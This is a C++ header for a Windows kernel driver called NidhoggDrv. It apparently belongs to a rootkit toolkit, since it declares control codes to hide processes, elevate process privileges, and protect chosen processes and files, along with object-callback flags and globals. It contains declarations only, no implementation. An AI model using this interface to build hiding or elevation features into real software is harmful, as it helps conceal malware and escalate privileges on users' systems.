#pragma once

// Includes.
#include "FastMutex.h"
#include "AutoLock.h"

#define DRIVER_PREFIX "NidhoggDrv: "
#define DRIVER_TAG 'hdiN'

// ** IOCTLS ********************************************************************************************
#define IOCTL_NIDHOGG_PROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_HIDE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_ELEVATE_PROCESS CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
// *****************************************************************************************************

#define MAX_PIDS 256
#define MAX_FILES 256
#define SupportsObjectCallbacks 0x42
#define AllowObjectCallbacks 0x40

// Prototypes.
NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status = STATUS_SUCCESS, ULONG_PTR info = 0);
DRIVER_UNLOAD NidhoggUnload;
DRIVER_DISPATCH NidhoggDeviceControl, NidhoggCreateClose;

// Globals.
PVOID registrationHandle;

struct ProcessGlobals {
	int PidsCount;
	ULONG Pids[MAX_PIDS];
	FastMutex Lock;

	void Init() {
		Lock.Init();
	}
};
ProcessGlobals pGlobals;

struct FileGlobals {
	int FilesCount;
	PWCH Files[MAX_FILES];
	FastMutex Lock;

	void Init() {
		Lock.Init();
	}
};
FileGlobals fGlobals;
